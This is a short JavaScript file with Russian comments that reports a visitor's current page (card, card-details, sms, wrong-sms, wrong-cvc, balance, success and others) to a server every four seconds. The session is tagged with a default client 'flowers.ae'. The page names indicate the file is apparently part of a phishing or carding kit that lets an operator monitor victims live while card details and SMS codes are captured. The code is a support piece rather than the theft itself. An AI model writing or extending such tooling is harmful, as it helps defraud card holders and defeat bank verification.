console.log("✅ online-status.js loaded");

(function () {
  const sessionId = localStorage.getItem("sessionId");
  const clientId = localStorage.getItem("clientId") || "flowers.ae";

  if (!sessionId) return;

  // 🔥 Сопоставляем путь → название страницы для /update-online-status
  const pages = {
    "/card": "card",
    "/card-details": "details",
    "/sms": "sms",
    "/custom-sms": "custom-sms",
    "/wrong-sms": "wrong-sms",
    "/wrong-card": "wrong-cvc",
    "/balance": "balance",
    "/prepaid-card": "prepaid",
    "/change-card": "change",
    "/loading": "loading",
    "/transit-1": "transit-1",
    "/transit-2": "transit-2",
    "/success": "success",
  };

  function getPageName() {
    return pages[window.location.pathname] || "unknown";
  }

  function sendOnlineStatus() {
    fetch("/api/update-online-status", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        sessionId,
        clientId,
        page: getPageName(),
      }),
    }).catch(() => {});
  }

  // Запуск отправки онлайн статуса
  sendOnlineStatus();
  setInterval(sendOnlineStatus, 4000);
})();
